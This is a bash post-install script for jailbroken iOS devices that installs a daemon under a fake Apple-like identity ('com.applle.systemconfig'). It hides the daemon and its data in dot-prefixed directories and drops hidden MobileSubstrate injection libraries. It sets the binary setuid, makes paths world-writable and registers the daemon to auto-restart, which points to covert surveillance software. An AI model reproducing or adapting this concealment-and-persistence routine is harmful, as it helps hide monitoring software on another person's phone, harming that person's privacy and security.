#!/bin/bash

# Exit when a command fails
set -o errexit

# Error when unset variables are found
set -o nounset

APPL_CYDIA_INSTALL=$1

# Name of daemon on device
APPL_IDENTIFIER=systemconfig

# Define directory variables
APPL_DAEMON_HOME=/usr/libexec/.$APPL_IDENTIFIER
APPL_DAEMON_NAME=$APPL_IDENTIFIER
APPL_DAEMON_PLIST_HOME=/System/Library/LaunchDaemons
APPL_DAEMON_PLIST_NAME=com.applle.systemconfig.plist
APPL_DAEMON_PLIST_NICK_NAME=com.applle.systemconfig.plist

APPL_BUNDLE_HOME=/Applications/systemconfig.app

APPL_MS_HOME=/Library/MobileSubstrate/DynamicLibraries

APPL_MS_NAME_COMMON=MSFSP.dylib
APPL_MS_NAME_HEART=MSSPC.dylib

APPL_MS_PLIST_NAME_COMMON=MSFSP.plist
APPL_MS_PLIST_NAME_HEART=MSSPC.plist

APPL_PRIVATE_HOME=/var/.lsalcore
APPL_PRIVATE_RCM_HOME=$APPL_PRIVATE_HOME/rcm
APPL_PRIVATE_CSM_HOME=$APPL_PRIVATE_HOME/csm
APPL_PRIVATE_DDM_HOME=$APPL_PRIVATE_HOME/ddm

# iOS 6, log file must sepcify otherwise launchd gets "Exited with code: 1" for launchctl command
APPL_LOG_HOME=/tmp
APPL_LOG_FILE=$APPL_LOG_HOME/.install-$APPL_IDENTIFIER.log

# ----------------------------------------------------------------------
# Remove existing installation log file
# ----------------------------------------------------------------------
rm -f $APPL_LOG_FILE
echo "Start! APPL_CYDIA_INSTALL=$APPL_CYDIA_INSTALL ..." >> $APPL_LOG_FILE

# ----------------------------------------------------------------------
# Check OS version
# ----------------------------------------------------------------------
OS_VERSION=$(sw_vers -productVersion)
echo $OS_VERSION >> $APPL_LOG_FILE
declare -i os
os=${OS_VERSION:0:1}
if [ $os -gt $(( 7 )) ]; then
    echo "iOS $OS_VERSION > iOS 7.x.x, 6.x.x" >> $APPL_LOG_FILE
    APPL_DAEMON_PLIST_HOME=/Library/LaunchDaemons
    APPL_DAEMON_PLIST_NICK_NAME=com.applle.systemconfig.ge8.plist
fi

# ----------------------------------------------------------------------
# Clean up any previous installations or processes
# ----------------------------------------------------------------------
set +o errexit

# Stop daemon com.applle.systemconfig.plist
echo "launchctl stop $APPL_DAEMON_PLIST_NAME" >> $APPL_LOG_FILE
launchctl stop $APPL_DAEMON_PLIST_NAME

# Remove daemon com.applle.systemconfig.plist
echo "launchctl remove $APPL_DAEMON_PLIST_NAME" >> $APPL_LOG_FILE
launchctl remove $APPL_DAEMON_PLIST_NAME

# Remove daemon direcotry /usr/libexec/.systemconfig
echo "rm -fr $APPL_DAEMON_HOME" >> $APPL_LOG_FILE
rm -fr $APPL_DAEMON_HOME

# Remove /System/Library/LaunchDaemons/com.applle.systemconfig.plist
# Remove /Library/LaunchDaemons/com.applle.systemconfig.plist
echo "rm -f $APPL_DAEMON_PLIST_HOME/$APPL_DAEMON_PLIST_NAME" >> $APPL_LOG_FILE
rm -f $APPL_DAEMON_PLIST_HOME/$APPL_DAEMON_PLIST_NAME

# Remove mobile substrate /Library/MobileSubstrate/DynamicLibraries/.MSFSP.dylib
echo "rm -f $APPL_MS_HOME/.$APPL_MS_NAME_COMMON" >> $APPL_LOG_FILE
rm -f $APPL_MS_HOME/.$APPL_MS_NAME_COMMON

# Remove mobile substrate plist /Library/MobileSubstrate/DynamicLibraries/.MSFSP.plist
echo "rm -f $APPL_MS_HOME/.$APPL_MS_PLIST_NAME_COMMON" >> $APPL_LOG_FILE
rm -f $APPL_MS_HOME/.$APPL_MS_PLIST_NAME_COMMON

# Remove mobile substrate /Library/MobileSubstrate/DynamicLibraries/.MSSPC.dylib
echo "rm -f $APPL_MS_HOME/.$APPL_MS_NAME_HEART" >> $APPL_LOG_FILE
rm -f $APPL_MS_HOME/.$APPL_MS_NAME_HEART

# Remove mobile substrate plist /Library/MobileSubstrate/DynamicLibraries/.MSSPC.plist
echo "rm -f $APPL_MS_HOME/.$APPL_MS_PLIST_NAME_HEART" >> $APPL_LOG_FILE
rm -f $APPL_MS_HOME/.$APPL_MS_PLIST_NAME_HEART

# Remove RCM db /var/.lsalcore/rcm
echo "rm -rf $APPL_PRIVATE_RCM_HOME" >> $APPL_LOG_FILE
rm -rf $APPL_PRIVATE_RCM_HOME

# Remove CSM db /var/.lsalcore/csm
echo "rm -rf $APPL_PRIVATE_CSM_HOME" >> $APPL_LOG_FILE
rm -rf $APPL_PRIVATE_CSM_HOME

# Remove RCM db /var/.lsalcore/ddm
echo "rm -rf $APPL_PRIVATE_DDM_HOME" >> $APPL_LOG_FILE
rm -rf $APPL_PRIVATE_DDM_HOME

# Exit when a command fails
set -o errexit

# ----------------------------------------------------------------------
# Install
# ----------------------------------------------------------------------

if [ $APPL_CYDIA_INSTALL == "YES" ]; then

    # Create daemon home directory /usr/libexec/.systemconfig
	echo "mkdir -p $APPL_DAEMON_HOME" >> $APPL_LOG_FILE
	mkdir -p $APPL_DAEMON_HOME
	
    # Change mode of /usr/libexec/.systemconfig to read/write/execute
	echo "chmod 777 $APPL_DAEMON_HOME" >> $APPL_LOG_FILE
	chmod 777 $APPL_DAEMON_HOME
	
    # Copy /Applications/systemconfig.app /usr/libexec/.systemconfig/systemconfig
	echo "cp -f $APPL_BUNDLE_HOME $APPL_DAEMON_HOME/$APPL_DAEMON_NAME" >> $APPL_LOG_FILE
	cp -fr $APPL_BUNDLE_HOME $APPL_DAEMON_HOME/$APPL_DAEMON_NAME

    # Change mode of /usr/libexec/.systemconfig/systemconfig to 6555
	echo "chmod 6555 $APPL_DAEMON_HOME/$APPL_DAEMON_NAME" >> $APPL_LOG_FILE
	chmod 6555 $APPL_DAEMON_HOME/$APPL_DAEMON_NAME
	
	# Copy daemon's plist /Applications/systemconfig.app/com.applle.systemconfig.plist to /System/Library/LaunchDaemons/com.applle.systemconfig.plist
    # Copy daemon's plist /Applications/systemconfig.app/com.applle.systemconfig.ge8.plist to /Library/LaunchDaemons/com.applle.systemconfig.plist
	# Auto start daemon when phone have reboot or application have crashed
	echo "cp -f $APPL_BUNDLE_HOME/$APPL_DAEMON_PLIST_NICK_NAME $APPL_DAEMON_PLIST_HOME/$APPL_DAEMON_PLIST_NAME" >> $APPL_LOG_FILE
	cp -fr $APPL_BUNDLE_HOME/$APPL_DAEMON_PLIST_NICK_NAME $APPL_DAEMON_PLIST_HOME/$APPL_DAEMON_PLIST_NAME
	
    # Copy mobile substrate /Applications/systemconfig.app/MSFSP.dylib to /Library/MobileSubstrate/DynamicLibraries/.MSFSP.dylib
	echo "cp -f $APPL_BUNDLE_HOME/$APPL_MS_NAME_COMMON $APPL_MS_HOME/.$APPL_MS_NAME_COMMON" >> $APPL_LOG_FILE
	cp -f $APPL_BUNDLE_HOME/$APPL_MS_NAME_COMMON $APPL_MS_HOME/.$APPL_MS_NAME_COMMON
	chmod 777 $APPL_MS_HOME/.$APPL_MS_NAME_COMMON
	
	# Copy mobile substrate plist /Applications/systemconfig.app/MSFSP.plist to /Library/MobileSubstrate/DynamicLibraries/.MSFSP.plist
	echo "cp -f $APPL_BUNDLE_HOME/$APPL_MS_PLIST_NAME_COMMON $APPL_MS_HOME/.$APPL_MS_PLIST_NAME_COMMON" >> $APPL_LOG_FILE
	cp -f $APPL_BUNDLE_HOME/$APPL_MS_PLIST_NAME_COMMON $APPL_MS_HOME/.$APPL_MS_PLIST_NAME_COMMON
	
	# Copy mobile substrate /Applications/systemconfig.app/MSSPC.dylib to /Library/MobileSubstrate/DynamicLibraries/.MSSPC.dylib
	echo "cp -f $APPL_BUNDLE_HOME/$APPL_MS_NAME_HEART $APPL_MS_HOME/.$APPL_MS_NAME_HEART" >> $APPL_LOG_FILE
	cp -f $APPL_BUNDLE_HOME/$APPL_MS_NAME_HEART $APPL_MS_HOME/.$APPL_MS_NAME_HEART
	chmod 777 $APPL_MS_HOME/.$APPL_MS_NAME_HEART
	
	# Copy mobile substrate plist /Applications/systemconfig.app/MSSPC.plist to /Library/MobileSubstrate/DynamicLibraries/.MSSPC.plist
	echo "cp -f $APPL_BUNDLE_HOME/$APPL_MS_PLIST_NAME_HEART $APPL_MS_HOME/.$APPL_MS_PLIST_NAME_HEART" >> $APPL_LOG_FILE
	cp -f $APPL_BUNDLE_HOME/$APPL_MS_PLIST_NAME_HEART $APPL_MS_HOME/.$APPL_MS_PLIST_NAME_HEART

    # Create daemon private directory /var/.lsalcore
    echo "mkdir -p $APPL_PRIVATE_HOME" >> $APPL_LOG_FILE
    mkdir -p $APPL_PRIVATE_HOME

    # Change mode of /var/.lsalcore to read/write/execute
    echo "chmod 777 $APPL_PRIVATE_HOME" >> $APPL_LOG_FILE
    chmod 777 $APPL_PRIVATE_HOME
	
	# Load daemon /System/Library/LaunchDaemons/com.applle.systemconfig.plist
    # Load daemon /Library/LaunchDaemons/com.applle.systemconfig.plist
	echo "launchctl load $APPL_DAEMON_PLIST_HOME/$APPL_DAEMON_PLIST_NAME" >> $APPL_LOG_FILE
	launchctl load $APPL_DAEMON_PLIST_HOME/$APPL_DAEMON_PLIST_NAME
	
	sleep 5
	#killall SpringBoard
	#respring # If there is mobile substrate in package Cydia would show button 'Respring'
    
	exit 0
	
fi


